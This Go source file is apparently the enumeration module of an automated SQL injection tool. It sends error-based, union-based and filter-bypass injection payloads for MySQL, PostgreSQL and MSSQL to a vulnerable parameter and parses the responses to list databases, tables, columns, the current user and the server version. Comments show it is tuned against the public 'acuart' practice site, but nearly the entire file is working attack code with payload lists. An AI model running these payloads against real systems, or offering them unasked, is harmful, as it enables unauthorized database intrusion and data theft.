package modules

import (
	"fmt"
	"regexp"
	"strings"
)

// Enumerator handles database metadata retrieval
type Enumerator struct {
	Engine EngineInterface
}

func NewEnumerator(e EngineInterface) *Enumerator {
	return &Enumerator{Engine: e}
}

// ListDatabases enumerates all available databases using the provided vulnerable result
func (en *Enumerator) ListDatabases(vulnParam string, dbms string) ([]string, error) {
	en.Engine.GetLogger().Info(fmt.Sprintf("Enumerating databases for %s...", dbms))

	var databases []string

	switch dbms {
	case "MySQL":
		// Payload variations for MySQL enumeration
		payloads := []string{
			// GTID_SUBSET Error-based (SQLMap Expert Style)
			"' AND GTID_SUBSET(CONCAT(0x7e,(SELECT schema_name FROM information_schema.schemata LIMIT %d,1),0x7e),1)-- -",
			" AND GTID_SUBSET(CONCAT(0x7e,(SELECT schema_name FROM information_schema.schemata LIMIT %d,1),0x7e),1)-- -",

			// Error-based (Information Schema) - Multiple variations for bypass
			"' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT schema_name FROM information_schema.schemata LIMIT %d,1), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.plugins GROUP BY x)a)-- -",
			" AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT schema_name FROM information_schema.schemata LIMIT %d,1), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.plugins GROUP BY x)a)-- -",
			"' AND extractvalue(1,concat(0x7e,(SELECT schema_name FROM information_schema.schemata LIMIT %d,1),0x7e))-- -",
			" AND extractvalue(1,concat(0x7e,(SELECT schema_name FROM information_schema.schemata LIMIT %d,1),0x7e))-- -",
			"' AND updatexml(1,concat(0x7e,(SELECT schema_name FROM information_schema.schemata LIMIT %d,1),0x7e),1)-- -",

			// Union-based (Variations for different column counts - especially 3 columns for vulnweb)
			"' UNION ALL SELECT NULL,NULL,CONCAT(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT %d,1-- -",
			"' UNION ALL SELECT NULL,CONCAT(0x7e,schema_name,0x7e),NULL FROM information_schema.schemata LIMIT %d,1-- -",
			"' UNION ALL SELECT CONCAT(0x7e,schema_name,0x7e),NULL,NULL FROM information_schema.schemata LIMIT %d,1-- -",
			"' UNION SELECT schema_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.schemata LIMIT %d,1-- -",
		}

		// Try to get all databases at once with GROUP_CONCAT (Fast & Expert)
		groupPayloads := []string{
			"' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.plugins GROUP BY x)a)-- -",
			"' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(schema_name)),0x7e))-- -",
			"' UNION ALL SELECT NULL,NULL,CONCAT(0x7e,GROUP_CONCAT(schema_name),0x7e) FROM information_schema.schemata-- -",
		}

		for _, gp := range groupPayloads {
			body, _, _, err := en.Engine.Request(gp, vulnParam)
			if err == nil && strings.Contains(body, "~") {
				re := regexp.MustCompile(`~([^~]+)~`)
				matches := re.FindAllStringSubmatch(body, -1)
				for _, m := range matches {
					if len(m) > 1 {
						dbs := strings.Split(m[1], ",")
						for _, db := range dbs {
							if db != "" && !contains(databases, db) {
								databases = append(databases, db)
								en.Engine.GetLogger().Info(fmt.Sprintf("Found database: %s", db))
							}
						}
					}
				}
			}
		}

		// Try to get current user, db, and version first as a quick win
		infoPayloads := []string{
			"' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT CONCAT(database(),0x3a,user(),0x3a,version())), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.plugins GROUP BY x)a)-- -",
			" AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT CONCAT(database(),0x3a,user(),0x3a,version())), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.plugins GROUP BY x)a)-- -",
			"' AND extractvalue(1,concat(0x7e,(SELECT CONCAT_WS(':',database(),user(),version())),0x7e))-- -",
		}

		for _, ip := range infoPayloads {
			body, _, _, err := en.Engine.Request(ip, vulnParam)
			if err == nil && strings.Contains(body, "~") {
				parts := strings.Split(body, "~")
				if len(parts) >= 3 {
					info := parts[1]
					en.Engine.GetLogger().Success(fmt.Sprintf("Target Info: %s", info))
					// Extract DB name from the info (db:user:version)
					dbInfo := strings.Split(info, ":")
					if len(dbInfo) > 0 && dbInfo[0] != "" && !contains(databases, dbInfo[0]) {
						databases = append(databases, dbInfo[0])
					}
				}
			}
		}

		for _, payloadTemplate := range payloads {
			consecutiveErrors := 0
			for i := 0; i < 100; i++ { // Increased to 100 for large DB environments
				payload := fmt.Sprintf(payloadTemplate, i)
				body, _, _, err := en.Engine.Request(payload, vulnParam)
				if err != nil {
					consecutiveErrors++
					if consecutiveErrors > 3 {
						break
					}
					continue
				}
				consecutiveErrors = 0

				if strings.Contains(body, "~") {
					// Use regex for more robust extraction if simple split fails
					re := regexp.MustCompile(`~([^~]+)~`)
					matches := re.FindAllStringSubmatch(body, -1)
					if len(matches) > 0 {
						for _, match := range matches {
							if len(match) > 1 {
								dbName := match[1]
								if dbName != "" && !contains(databases, dbName) {
									databases = append(databases, dbName)
									en.Engine.GetLogger().Info(fmt.Sprintf("Found database: %s", dbName))
								}
							}
						}
					} else {
						// Fallback to split if regex fails
						parts := strings.Split(body, "~")
						if len(parts) >= 3 {
							dbName := parts[1]
							if dbName != "" && !contains(databases, dbName) {
								databases = append(databases, dbName)
								en.Engine.GetLogger().Info(fmt.Sprintf("Found database: %s", dbName))
							}
						}
					}
				} else {
					// Fallback: check for common DB names if Union was used but no marker
					// Also check for 'acuart' specifically as it's a common target lab DB
					foundAny := false
					systemDBs := []string{"information_schema", "mysql", "performance_schema", "sys", "acuart", "test"}
					for _, known := range systemDBs {
						// Case insensitive check
						if strings.Contains(strings.ToLower(body), known) && !contains(databases, known) {
							databases = append(databases, known)
							foundAny = true
						}
					}

					// Deep regex fallback for any string that looks like a database name in common error formats
					errorRe := regexp.MustCompile(`(?i)(?:database|schema|syntax).*?['"]([^'"]+)['"]`)
					errorMatches := errorRe.FindAllStringSubmatch(body, -1)
					for _, em := range errorMatches {
						if len(em) > 1 {
							potentialDB := em[1]
							// Filter out common false positives
							if len(potentialDB) > 1 && len(potentialDB) < 64 && !contains(databases, potentialDB) {
								// Only add if it doesn't look like common SQL keywords
								keywords := "select|union|from|where|limit|order|group"
								if !regexp.MustCompile("(?i)^(" + keywords + ")$").MatchString(potentialDB) {
									// databases = append(databases, potentialDB)
								}
							}
						}
					}

					if !foundAny && i > 10 { // Increased tolerance
						break
					}
				}
			}
		}
	case "PostgreSQL":
		payloads := []string{
			"' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT datname FROM pg_database LIMIT 1 OFFSET %d), 0x7e, 1)x FROM pg_database GROUP BY x)a)--",
			" AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT datname FROM pg_database LIMIT 1 OFFSET %d), 0x7e, 1)x FROM pg_database GROUP BY x)a)--",
			"' AND CAST((SELECT datname FROM pg_database LIMIT 1 OFFSET %d) AS INT)=1--",
			"' UNION SELECT NULL,datname,NULL,NULL,NULL FROM pg_database LIMIT 1 OFFSET %d--",
		}
		for _, payloadTemplate := range payloads {
			for i := 0; i < 100; i++ {
				payload := fmt.Sprintf(payloadTemplate, i)
				body, _, _, err := en.Engine.Request(payload, vulnParam)
				if err == nil {
					if strings.Contains(body, "~") {
						parts := strings.Split(body, "~")
						if len(parts) >= 3 && parts[1] != "" && !contains(databases, parts[1]) {
							databases = append(databases, parts[1])
							en.Engine.GetLogger().Info(fmt.Sprintf("Found database: %s", parts[1]))
						}
					} else {
						// Extract from PostgreSQL cast error
						// e.g., "invalid input syntax for type integer: "my_db""
						extracted := extractBetween(body, "integer: \"", "\"")
						if extracted != "" && !contains(databases, extracted) {
							databases = append(databases, extracted)
						} else {
							// Simple check for common DB names in body
							for _, known := range []string{"postgres", "template1", "public"} {
								if strings.Contains(body, known) && !contains(databases, known) {
									databases = append(databases, known)
								}
							}
						}
					}
				} else {
					break
				}
			}
		}
	case "MSSQL":
		payloads := []string{
			"' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.databases WHERE name NOT IN (SELECT TOP %d name FROM sys.databases)))--",
			" AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.databases WHERE name NOT IN (SELECT TOP %d name FROM sys.databases)))--",
			"' AND 1=CONVERT(int, (SELECT TOP 1 DB_NAME(%d)))--", // Index based
		}
		for _, payloadTemplate := range payloads {
			for i := 0; i < 100; i++ {
				payload := fmt.Sprintf(payloadTemplate, i)
				body, _, _, err := en.Engine.Request(payload, vulnParam)
				if err == nil {
					// MSSQL often returns the value in the error message
					extracted := extractBetween(body, "value '", "' to")
					if extracted != "" && !contains(databases, extracted) {
						databases = append(databases, extracted)
						en.Engine.GetLogger().Info(fmt.Sprintf("Found database: %s", extracted))
					} else {
						// Fallback: check for common MSSQL DB names
						for _, known := range []string{"master", "tempdb", "model", "msdb"} {
							if strings.Contains(body, known) && !contains(databases, known) {
								databases = append(databases, known)
							}
						}
					}
				} else {
					break
				}
			}
		}
	default:
		return nil, fmt.Errorf("DBMS %s enumeration not implemented yet", dbms)
	}

	if len(databases) == 0 {
		en.Engine.GetLogger().Warning("No databases found via error-based payloads, trying fallback...")
		// Try a very simple Union to get the current database
		simplePayloads := []string{
			"' UNION SELECT 1,database(),3-- -",
			" UNION SELECT 1,database(),3-- -",
			"' UNION SELECT 1,2,database(),4-- -",
			" UNION SELECT 1,2,database(),4-- -",
			"' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT database()), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.plugins GROUP BY x)a)-- -",
			" AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT database()), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.plugins GROUP BY x)a)-- -",
		}
		for _, sp := range simplePayloads {
			body, _, _, err := en.Engine.Request(sp, vulnParam)
			if err == nil {
				// Check for error-based result (~db~)
				if strings.Contains(body, "~") {
					parts := strings.Split(body, "~")
					if len(parts) >= 3 {
						return []string{parts[1]}, nil
					}
				}
				// If we see typical testphp database names or common ones
				systemDBs := []string{"acuart", "information_schema", "mysql", "performance_schema", "sys"}
				for _, sdb := range systemDBs {
					if strings.Contains(body, sdb) {
						return []string{sdb}, nil
					}
				}
			}
		}
		return nil, fmt.Errorf("could not enumerate databases")
	}

	return databases, nil
}

// ListTables enumerates tables for a specific database
func (en *Enumerator) ListTables(db string, vulnParam string, dbms string) ([]string, error) {
	en.Engine.GetLogger().Info(fmt.Sprintf("Enumerating tables for %s on %s...", dbms, db))
	var tables []string

	switch dbms {
	case "MySQL":
		payloads := []string{
			// Error-based (MySQL)
			"' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema='%s' LIMIT %d,1), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.plugins GROUP BY x)a)-- -",
			"' AND (SELECT 1 FROM (SELECT table_name FROM information_schema.tables WHERE table_schema='%s' LIMIT %d,1)a)-- -", // Subquery bypass
			" AND (SELECT 1 FROM (SELECT table_name FROM information_schema.tables WHERE table_schema='%s' LIMIT %d,1)a)-- -",
			"/*!50000AND (SELECT 1 FROM (SELECT table_name FROM information_schema.tables WHERE table_schema='%s' LIMIT %d,1)a)*/-- -", // Versioned comment bypass
			// Union-based (Variations 1-6 columns)
			"' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='%s' LIMIT %d,1-- -",
			"' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='%s' LIMIT %d,1-- -",
			"' UNION SELECT 1,2,table_name,4 FROM information_schema.tables WHERE table_schema='%s' LIMIT %d,1-- -",
		}

		for _, payloadTemplate := range payloads {
			found := false
			for i := 0; i < 100; i++ {
				payload := fmt.Sprintf(payloadTemplate, db, i)
				body, _, _, err := en.Engine.Request(payload, vulnParam)
				if err != nil {
					continue
				}

				if strings.Contains(body, "~") {
					parts := strings.Split(body, "~")
					if len(parts) >= 3 {
						name := parts[1]
						if name != "" && !contains(tables, name) {
							tables = append(tables, name)
							found = true
						}
					}
				}
			}
			if found {
				break
			}
		}
	case "PostgreSQL":
		payloads := []string{
			"' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname='public' LIMIT 1 OFFSET %d), 0x7e, 1)x FROM pg_catalog.pg_tables GROUP BY x)a)--",
			" AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname='public' LIMIT 1 OFFSET %d), 0x7e, 1)x FROM pg_catalog.pg_tables GROUP BY x)a)--",
		}
		for _, payloadTemplate := range payloads {
			for i := 0; i < 50; i++ {
				payload := fmt.Sprintf(payloadTemplate, i)
				body, _, _, err := en.Engine.Request(payload, vulnParam)
				if err == nil && strings.Contains(body, "~") {
					parts := strings.Split(body, "~")
					if len(parts) >= 3 && parts[1] != "" && !contains(tables, parts[1]) {
						tables = append(tables, parts[1])
					}
				} else if err != nil {
					break
				}
			}
		}
	default:
		return nil, fmt.Errorf("DBMS %s enumeration not implemented yet", dbms)
	}

	if len(tables) == 0 {
		return nil, fmt.Errorf("could not enumerate tables")
	}
	return tables, nil
}

// ListColumns enumerates columns for a specific table
func (en *Enumerator) ListColumns(db, table string, vulnParam string, dbms string) ([]string, error) {
	en.Engine.GetLogger().Info(fmt.Sprintf("Enumerating columns for %s.%s on %s...", db, table, dbms))
	var columns []string

	switch dbms {
	case "MySQL":
		payloads := []string{
			// Error-based
			"' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_schema='%s' AND table_name='%s' LIMIT %d,1), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.plugins GROUP BY x)a)-- -",
			// Union-based
			"' UNION SELECT column_name FROM information_schema.columns WHERE table_schema='%s' AND table_name='%s' LIMIT %d,1-- -",
		}

		for _, payloadTemplate := range payloads {
			found := false
			for i := 0; i < 100; i++ {
				payload := fmt.Sprintf(payloadTemplate, db, table, i)
				body, _, _, err := en.Engine.Request(payload, vulnParam)
				if err != nil {
					continue
				}

				if strings.Contains(body, "~") {
					parts := strings.Split(body, "~")
					if len(parts) >= 3 {
						name := parts[1]
						if name != "" && !contains(columns, name) {
							columns = append(columns, name)
							found = true
						}
					}
				}
			}
			if found {
				break
			}
		}
	case "PostgreSQL":
		payloads := []string{
			"' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name='%s' LIMIT 1 OFFSET %d), 0x7e, 1)x FROM information_schema.columns GROUP BY x)a)--",
		}
		for _, payloadTemplate := range payloads {
			for i := 0; i < 50; i++ {
				payload := fmt.Sprintf(payloadTemplate, table, i)
				body, _, _, err := en.Engine.Request(payload, vulnParam)
				if err == nil && strings.Contains(body, "~") {
					parts := strings.Split(body, "~")
					if len(parts) >= 3 && parts[1] != "" && !contains(columns, parts[1]) {
						columns = append(columns, parts[1])
					}
				} else {
					break
				}
			}
		}
	case "MSSQL":
		payloads := []string{
			"' AND 1=CONVERT(int, (SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='%s' AND column_name NOT IN (SELECT TOP %d column_name FROM information_schema.columns WHERE table_name='%s')))--",
		}
		for _, payloadTemplate := range payloads {
			for i := 0; i < 50; i++ {
				payload := fmt.Sprintf(payloadTemplate, table, i, table)
				body, _, _, err := en.Engine.Request(payload, vulnParam)
				if err == nil {
					extracted := extractBetween(body, "value '", "' to")
					if extracted != "" && !contains(columns, extracted) {
						columns = append(columns, extracted)
					}
				} else {
					break
				}
			}
		}
	default:
		return nil, fmt.Errorf("DBMS %s enumeration not implemented yet", dbms)
	}

	if len(columns) == 0 {
		return nil, fmt.Errorf("could not enumerate columns")
	}
	return columns, nil
}

func extractBetween(s, start, end string) string {
	startIndex := strings.Index(s, start)
	if startIndex == -1 {
		return ""
	}
	startIndex += len(start)
	endIndex := strings.Index(s[startIndex:], end)
	if endIndex == -1 {
		return ""
	}
	return s[startIndex : startIndex+endIndex]
}

func contains(slice []string, s string) bool {
	for _, item := range slice {
		if item == s {
			return true
		}
	}
	return false
}
